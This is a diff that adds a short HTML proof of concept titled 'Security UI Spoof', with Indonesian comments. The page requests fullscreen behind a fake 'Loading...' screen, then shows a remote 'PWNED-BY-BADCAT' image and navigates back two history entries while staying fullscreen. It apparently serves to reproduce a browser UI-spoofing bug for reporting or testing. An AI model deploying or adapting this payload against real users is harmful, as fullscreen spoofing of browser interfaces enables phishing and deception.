@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            window.onload = function() {
+                // Meminta fullscreen saat halaman dimuat
+                document.documentElement.requestFullscreen();
+
+                // Setelah 1,5 detik, tampilkan gambar dan sembunyikan konten
+                setTimeout(function(){
+                    document.getElementById("spoof").style.display = "block";
+                    document.getElementById("content").style.display = "none";
+                }, 1500);
+
+                // Kembali ke halaman sebelumnya setelah 3,5 detik, tetap dalam mode fullscreen
+                setTimeout(function() {
+                    history.go(-2);
+                }, 3500);
+            };
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="https://i.ibb.co.com/m8RJ1rq/PWNED-BY-BADCAT.gif" alt="Spoof Image"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Loading...</h1>
+            </center>
+        </div>
+    </body>
+</html>
